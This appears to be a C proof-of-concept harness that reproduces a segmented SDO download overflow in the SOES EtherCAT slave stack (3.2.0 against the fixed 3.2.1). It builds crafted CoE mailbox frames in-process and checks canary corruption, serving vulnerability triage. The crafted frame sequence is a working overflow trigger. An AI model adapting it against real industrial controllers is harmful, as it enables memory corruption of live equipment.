/* SOES 3.2.0 vs 3.2.1 — CVE-2026-129798 source-bound triage.
 *
 * Drives the REAL ESC_coeprocess() -> SDO_download() -> SDO_downloadsegment()
 * path with crafted mailbox bytes. The initial download declares an object's
 * full size but carries no payload bytes, so both releases enter segmented
 * mode (3.2.0 esc_coe.c:852, 3.2.1 esc_coe.c:896). Three 7-byte segment
 * requests then write past the object's declared RAM capacity in 3.2.0, which
 * copies without a cumulative bound (esc_coe.c:1057). The pinned 3.2.1 adds
 * fragsleft initialisation and rejects fragsleft + size > capacity
 * (esc_coe.c:1132), aborting the second segment.
 *
 * Object dictionary here is a modeled precondition: a writable OCTET_STRING
 * with RAM data. MBX[] is filled in-process: no wire, no HAL, no live slave,
 * no leaked address, no command side effect. Rung 3 on a real pinned handler,
 * rung 4 harness-level at most — NOT wire evidence and NOT rung 5.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* Real MBX/MBXcontrol/ESCvar and the real object handlers from ecat_slv.c. */
#include "ecat_slv.c"

static uint8_t g_seg_alone[16];   /* standalone global: ASan sees true bounds */
static struct {
   uint8_t data[16];
   uint8_t canary[128];
} g_seg;
static struct {
   uint8_t data[32];
   uint8_t canary[128];
} g_seg_safe;
static uint8_t g_ms3;

static const char n_ms3[] = "maxsub", n_seg[] = "segmented-object";

static const _objd od_2003[] = {
   { 0, DTYPE_UNSIGNED8,    8, ATYPE_RO,    n_ms3, 0, &g_ms3      },
   { 1, DTYPE_OCTET_STRING, 128, ATYPE_RWpre, n_seg, 0, g_seg.data },
};
static const _objd od_2004[] = {
   { 0, DTYPE_UNSIGNED8,    8, ATYPE_RO,    n_ms3, 0, &g_ms3         },
   { 1, DTYPE_OCTET_STRING, 128, ATYPE_RWpre, n_seg, 0, g_seg_alone  },
};
static const _objd od_2005[] = {
   { 0, DTYPE_UNSIGNED8,    8, ATYPE_RO,    n_ms3, 0, &g_ms3            },
   { 1, DTYPE_OCTET_STRING, 256, ATYPE_RWpre, n_seg, 0, g_seg_safe.data },
};
const _objectlist SDOobjects[] = {
   { 0x2003, OTYPE_RECORD, 1, 0, n_seg, od_2003 },
   { 0x2004, OTYPE_RECORD, 1, 0, n_seg, od_2004 },
   { 0x2005, OTYPE_RECORD, 1, 0, n_seg, od_2005 },
   { 0xFFFF, 0, 0, 0, NULL, NULL },
};

/* Stubs for ecat_slv.c externs unused on this path. A nonzero buffer index
 * is required: SDO_downloadsegment performs its copy inside if (MBXout). */
void ESC_write(uint16_t a, void *b, uint16_t l) { (void)a;(void)b;(void)l; }
void FOE_init(void) {}
void EOE_init(void) {}
void MBX_error(uint16_t err) { (void)err; }
uint8_t ESC_claimbuffer(void) { return 1; }
void ESC_read(uint16_t address, void *buf, uint16_t len)
{ (void)address; if (len) memset(buf, 0, len); }

/* Initial SDO Download: declared size is the full object, mailbox payload
 * empty. The copied initial chunk is the 4-byte size field. */
static void build_init(uint16_t index, uint32_t declared)
{
   memset(MBX, 0, sizeof(MBX));
   _COEsdo *s = (_COEsdo *)&MBX[0];
   s->mbxheader.length = htoes(COE_HEADERSIZE + 4);
   s->mbxheader.mbxtype = MBXCOE;
   s->coeheader.numberservice = htoes(COE_SDOREQUEST << 12);
   s->command = COE_COMMAND_DOWNLOADREQUEST;
   s->index = htoes(index);
   s->subindex = 1;
   s->size = htoel(declared);
}

/* Seven-byte SDO Download Segment request. Data bytes live at &coesdo->index
 * (struct offset 9); mbxheader.length - 3 = 7 is the copy size. */
static void build_segment(int toggle, int last, uint8_t fill)
{
   memset(MBX, 0, sizeof(MBX));
   _COEsdo *s = (_COEsdo *)&MBX[0];
   s->mbxheader.length = htoes(3 + 7);
   s->mbxheader.mbxtype = MBXCOE;
   s->coeheader.numberservice = htoes(COE_SDOREQUEST << 12);
   s->command = (uint8_t)(COE_COMMAND_DOWNLOADSEGREQ |
                 (toggle ? COE_TOGGLEBIT : 0) |
                 (last ? COE_COMMAND_LASTSEGMENTBIT : 0));
   uint8_t *data = (uint8_t *)&s->index;
   for (unsigned i = 0; i < 7; i++) data[i] = (uint8_t)(fill + i);
}

static void deliver(const char *label, uint16_t index, uint8_t subindex)
{
   MBXcontrol[0].state = MBXstate_inclaim;
   ESCvar.xoe = 0;
   ESC_coeprocess();
   printf("%s: index=%04x sub=%u xoe=%02x segmented=%02x "
          "data_off=%ld fragsleft=%u\n",
          label, index, subindex, ESCvar.xoe, ESCvar.segmented,
          ESCvar.data ? (long)((uint8_t *)ESCvar.data -
                               (uint8_t *)&g_seg.data) : -1L,
          (unsigned)ESCvar.fragsleft);
}

static unsigned canary_count(const uint8_t *p)
{
   unsigned n = 0;
   for (unsigned i = 0; i < 128; i++) n += (p[i] != 0);
   return n;
}

int main(int argc, char **argv)
{
   const char *mode = argc > 1 ? argv[1] : "overflow";
   uint8_t fill0 = argc > 2 ? (uint8_t)strtoul(argv[2], NULL, 0) : 0x41;
   uint16_t index;
   uint32_t declared;
   uint8_t *canary;

   memset(&g_seg, 0, sizeof(g_seg));
   memset(&g_seg_safe, 0, sizeof(g_seg_safe));
   memset(g_seg_alone, 0, sizeof(g_seg_alone));
   g_ms3 = 0;
   ESCvar.MBXrun = 1;
   ESCvar.ALstatus = ESCpreop;
   ESCvar.activembxsize = MBXSIZE;   /* response buffer must not alias MBX[0] */
   memset(MBXcontrol, 0, sizeof(MBXcontrol));
   ESCvar.xoe = 0;
   ESCvar.segmented = 0;
   ESCvar.frags = 0;
   ESCvar.fragsleft = 0;
   ESCvar.index = 0;
   ESCvar.subindex = 0;
   ESCvar.flags = 0;
   ESCvar.data = NULL;

#ifdef SOES_FIXED_VERSION
   printf("build: 3.2.1 (hash-pinned fixed source)\n");
#else
   printf("build: 3.2.0 (hash-pinned vulnerable source)\n");
#endif
   printf("mode: %s\n", mode);
   printf("fill0: %02x\n", fill0);
   if (strcmp(mode, "overflow-global") == 0) {
      index = 0x2004; declared = 16; canary = NULL;
   } else if (strcmp(mode, "safe") == 0) {
      index = 0x2005; declared = 32; canary = g_seg_safe.canary;
   } else if (strcmp(mode, "overflow") == 0) {
      index = 0x2003; declared = 16; canary = g_seg.canary;
   } else {
      printf("unknown mode\n");
      return 2;
   }

   build_init(index, declared);
   deliver("initial download (declared full size, no payload)", index, 1);
   build_segment(0, 0, fill0);
   deliver("segment 1 (7 bytes)", index, 1);
   build_segment(1, 0, (uint8_t)(fill0 + 1));
   deliver("segment 2 (7 bytes)", index, 1);
   build_segment(0, 1, (uint8_t)(fill0 + 2));
   deliver("segment 3 (7 bytes, last)", index, 1);

   printf("seg[0..31]:");
   for (unsigned i = 0; i < 32; i++) {
      const uint8_t *p = index == 0x2005 ? g_seg_safe.data : g_seg.data;
      printf(" %02x", p[i]);
   }
   printf("\n");
   if (canary) {
      printf("canary[0..15]:");
      for (unsigned i = 0; i < 16; i++) printf(" %02x", canary[i]);
      printf("\nverdict: canary_nonzero=%u\n", canary_count(canary));
   } else {
      printf("verdict: standalone global target (ASan reports bounds)\n");
   }
   return 0;
}
